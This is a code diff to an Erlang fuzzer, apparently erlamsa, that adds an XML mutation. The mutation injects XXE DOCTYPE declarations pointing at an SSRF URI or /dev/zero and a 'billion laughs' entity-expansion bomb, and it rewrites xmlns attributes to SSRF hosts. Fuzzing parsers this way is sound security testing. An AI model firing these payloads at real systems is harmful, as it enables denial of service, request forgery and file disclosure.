@@ -591,6 +591,78 @@ sgml_breaktag(Ast, T) ->
                 [Elem | Tree]
         end, []).
 
+xmlns_modify_params(Params) ->
+    NewParams = xmlns_modify_params(Params, []),
+    case Params =:= NewParams of
+        true -> 
+            Uri = lists:flatten(["http", erlamsa_mutations:get_ssrf_uri()]),
+            [{"xmlns", Uri, "\""},
+             {"xmlns:xsi", Uri, "\""},
+             {"xsi:schemaLocation", Uri, "\""}
+             | Params];
+        _Else -> NewParams
+    end.
+
+xmlns_modify_params([{Name = [$x, $m, $l, $n, $s | _NameTail], Uri, Delim} | T], Acc) ->
+    NewUri = lists:flatten(
+                case erlamsa_rnd:erand(2) of
+                    1 -> Uri ++ " http" ++ erlamsa_mutations:get_ssrf_uri();
+                    2 -> "http" ++ erlamsa_mutations:get_ssrf_uri()
+                end),
+    xmlns_modify_params(T, [{Name, NewUri, Delim}|Acc]);
+xmlns_modify_params([H | T], Acc) ->
+    xmlns_modify_params(T, [H|Acc]);
+xmlns_modify_params([], Acc) -> 
+    lists:reverse(Acc).
+
+xmlns_modify(Tag = {tag, Name1, Name2, Params, Childs}, T) ->
+    case erlamsa_rnd:erand(trunc(T*1.5)) of
+        1 -> 
+            NewParams = xmlns_modify_params(Params),
+            {tag, Name1, Name2, NewParams, Childs};
+        _Else ->
+            Tag
+    end.
+
+sgml_xmlfeatures(Ast = [H|T], NT, 0) when NT > 0 ->
+    case H of
+        {que, _} -> 
+            Elem = erlamsa_rnd:erand(NT),
+            {Tag, _, Place} = select_tag(T, Elem),
+            {tag, TagName, TagName, P, L} = Tag,
+            SSRFUri = erlamsa_mutations:get_ssrf_uri(),
+            DocType = erlamsa_rnd:rand_elem([
+                %% TODO: add more exploits
+                %% XXEs
+                io_lib:format("<!DOCTYPE ~s PUBLIC \"...\" \"http~s\">", [TagName, SSRFUri]),
+                io_lib:format("<!DOCTYPE ~s SYSTEM \"/dev/zero\">", [TagName]),
+                io_lib:format("<!DOCTYPE ~s SYSTEM \"http~s\">", [TagName, SSRFUri]),
+                io_lib:format("<!DOCTYPE ~s [<!ELEMENT ~s ANY ><!ENTITY xxe SYSTEM \"http~s\" >]>", 
+                              [TagName, TagName, SSRFUri]),
+                %% billion of lol'z
+                io_lib:format("<!DOCTYPE ~s [~n <!ENTITY lol \"lol\">~n <!ELEMENT lolz (#PCDATA)>~n<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">~n<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">~n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">~n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">~n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">~n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">~n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">~n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">~n<!ENTITY xxe \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">~n]>", [TagName])                             
+                ]),
+            XXE = {text, list_to_binary(lists:flatten(DocType))},           
+            NewTag = {tag, TagName, TagName, P, [{text,<<"&xxe;">>}|L]},
+            {NewT, _, _} = replace_elem(T, Place, NewTag),
+            {[H, XXE | NewT], [{sgml_xmlfeatures, xxe}], 1};
+        _Else -> {Ast, [{sgml_xmlfeatures, failed}], -1}
+    end;
+sgml_xmlfeatures(Ast, NT, 1) when NT > 0 ->
+    {NewAst, _, _} = walk(Ast,
+        fun (Tag = {tag,_, _, _, _}, Tree, T, _) ->
+                NewTag = xmlns_modify(Tag, T),
+                [NewTag | Tree]; 
+            (Elem, Tree, _, _) ->
+                [Elem | Tree]
+        end,
+        []),
+    case Ast =:= NewAst of
+        true -> {Ast, [{sgml_xmlfeatures, failed}], -1};
+        _Else -> {NewAst, [{sgml_xmlfeatures, xmlns}], 1}
+    end;
+sgml_xmlfeatures(Ast, NT, _) when NT > 0 ->
+    {Ast, [{sgml_xmlfeatures, -1}], -1}.
 
 mutate_innertext_prob(Binary, _Muta, Prob, Rnd) when Rnd > Prob ->
     {[], Binary}; %% No mutations
@@ -623,7 +695,7 @@ try_mutate_innertext(El, _Muta, _NT) -> {[], El}.
 
 sgml_mutation(Ast, {N, NT}) ->
     % io:format("~n~n~w~n~n", [Ast]),
-    sgml_mutation(Ast, {N, NT}, erlamsa_rnd:rand(12)). %%12
+    sgml_mutation(Ast, {N, NT}, erlamsa_rnd:rand(12)).
 
 sgml_mutation(Ast, {N, _NT}, 0) ->
     {Res, _, _} = sgml_swap(Ast, N),
@@ -649,6 +721,9 @@ sgml_mutation(Ast, {_N, NT}, 6) ->
 sgml_mutation(Ast, {N, _NT}, 7) ->
     {Res, _, _} = sgml_insert(Ast, N),
     {[{sgml_insert, 1}], Res, 1};
+sgml_mutation(Ast, {_N, NT}, 8) ->
+    {Res, Meta, D} = sgml_xmlfeatures(Ast, NT, 1), %erlamsa_rnd:erand(2)
+    {Meta, Res, D};
 sgml_mutation(Ast, {_N, NT}, _R) ->  %% Prob = 25% for inner mutation 
     %%TODO: here we're guessing that mutation was successfull
     %%FIXME: may be count text elements before going to mutate?
